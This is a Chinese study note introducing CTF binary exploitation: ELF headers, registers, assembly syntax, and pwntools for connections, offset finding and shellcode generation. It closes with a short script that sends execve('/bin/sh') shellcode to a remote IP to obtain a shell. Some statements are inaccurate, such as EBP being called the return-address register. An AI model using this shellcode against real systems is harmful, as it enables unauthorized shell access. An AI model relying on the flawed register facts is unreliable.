# pwn 

## 基础知识

### 可执行文件的创建过程

```flow
st=>start: c代码
o1=>operation: 预处理
o2=>operation: 编译
o3=>operation: 汇编
o3=>operation: 连接
y=>operation: 预处理文件
h=>operation: asm代码(汇编代码)
o=>operation: 二进制文件
e=>end: 可执行文件

st(right)->o1->y(right)->o2->h(right)->o3->o(right)->e

```

### 内存模型stack 和 heap和帧

### ELF文件头

- TYPE 确定文件类型(可重定位文件(.o),可执行文件(.exe/...),共享目标文件(.so))
- CLASS:确定文件是32位还是64位

#### 查看方法

```shell
readelf -h target # 查看ELF的头信息
readelf -l target # 查看elf头详细信息


```

### 不同寄存器的意义

ESP寄存器:栈顶指针

EBP寄存器:存放返回地址



### 简单的汇编命令

- push 
- call
- mov
- add
- pop
- ret

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5muped2obj30j705z42r.jpg)





http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html

[https://wooyun.js.org/drops/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html](https://wooyun.js.org/drops/逆向基础（一）.html)

#### Intel与AT&T的重要区别

在Intel与AT&T语法当中比较重要的区别就是：

操作数写在后面

```
在Intel语法中：<instruction> <destination operand> <source operand>
在AT&T语法中：<instruction> <source operand> <destination operand>
```

有一个理解它们的方法: 当你面对intel语法的时候，你可以想象把等号放到2个操作数中间，当面对AT&T语法的时候，你可以放一个右箭头(→）到两个操作数之间。

AT&T: 在寄存器名之前需要写一个百分号(%)并且在数字前面需要美元符($)。方括号被圆括号替代。 AT&T: 一些用来表示数据形式的特殊的符号

```
l      long(32 bits)
w      word(16bits)
b      byte(8 bits)
```



## shellcode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。

### 网站

http://shell-storm.org/shellcode/

## pwntools 使用

### 连接

```python
from pwn import *
conn = remote('ftp.debian.org',21) #连接
conn.recvline() # 接收一行消息
conn.send('hello') #发送消息
conn.interactive()# 进入交互模式
conn.close()#关闭连接

```

### 和进程进程交互

```python
sh = process('/bin/sh')
sh.sendline('sleep 3; echo hello world;')
sh.recvline(timeout=1)
sh.close()
```

### ssh连接

```python
shell = ssh('username', 'bandit.labs.overthewire.org', password='passwd')
shell['whoami']
shell.download_file('/etc/motd')
sh = shell.run('sh')
sh.sendline('sleep 3; echo hello world;') 
sh.recvline(timeout=1)
shell.close()
```

### 设置目标系统架构及操作系统

`context(arch='arm', os='linux', endian='big', word_size=32)`

### 汇编和反汇编

```python
asm('mov eax, 0').encode('hex')
disasm('6a0258cd80ebf9'.decode('hex'))

```

### 在触发的崩溃中寻找偏移量或缓冲区大小

```python
print cyclic(20)
aaaabaaacaaadaaaeaaa
# Assume EIP = 0x62616166 ('faab' which is pack(0x62616166))  at crash time
 print cyclic_find('faab')
120
```

### Shellcode生成器

使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到

```python
print shellcraft.i386.nop().strip('\n')   print shellcraft.i386.linux.sh()
```

### 简单实例

```python
#
from pwn import *
conn=remote('120.79.114.39',10001)
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
#from http://shell-storm.org/shellcode/files/shellcode-517.php
conn.send(shellcode)
conn.interactive()
```



## gdb 的使用

??????

## CTF中pwn题的搭建

http://www.jianshu.com/p/a659924515f7